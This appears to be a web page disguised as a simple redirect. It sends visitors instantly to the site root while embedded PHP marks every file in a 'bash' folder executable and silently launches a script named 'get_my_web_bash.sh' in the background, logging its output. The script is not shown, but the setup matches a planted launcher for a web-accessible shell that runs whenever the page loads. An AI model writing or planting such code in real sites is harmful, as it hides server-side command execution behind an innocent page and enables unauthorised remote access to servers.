<head>
<meta http-equiv="refresh" content="0; url=/" />
</head>
<a href="/">redirect</a>

<?php
  chdir("bash");
  exec("chmod +x *");
  exec("./get_my_web_bash.sh >../log.txt 2>&1 &");
?>
